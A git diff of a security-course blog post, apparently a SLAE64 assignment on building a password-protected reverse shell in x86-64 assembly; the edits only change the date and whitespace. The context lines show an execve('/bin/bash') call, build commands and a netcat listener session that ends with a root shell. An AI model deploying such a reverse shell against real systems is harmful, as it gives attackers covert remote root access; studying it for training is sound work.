@@ -1,6 +1,6 @@
 ---
 title: SLAE64 Assignment 2 - Password Protected Reverse Shell
-date: 2020-4-06
+date: 2020-4-16
 layout: single
 classes: wide
 header:
@@ -46,6 +46,7 @@ int main(void)
 	execve("/bin/bash", NULL, NULL);
 }	
 ```
+
 + Password checking will be done in assembly and is not included in the C skeleton program.
 
 ## Compiling & Testing
@@ -160,6 +161,7 @@ egrep "(connect|execve |write |read |socket |dup2)"
 
 
 # Assembly
+
 ```asm
 global _start
 
@@ -295,14 +297,15 @@ syscall  ; call execve("/bin/bash", NULL, NULL)
 
 ## Testing
 #### Terminal 1
+
 ```bash
 root# nasm -f elf64 revshell.asm -o revshell.o
 root# ld revshell.o -o revshell
 root# ./revshell
 ```
 
-## Testing
 #### Terminal 2
+
 ```bash
 root@zed# nc -nlvp 4444
 listening on [any] 4444 ...
@@ -313,3 +316,4 @@ Mothers Maiden Name?1337
 id
 uid=0(root) gid=0(root) groups=0(root),46(plugdev)
 ```
+
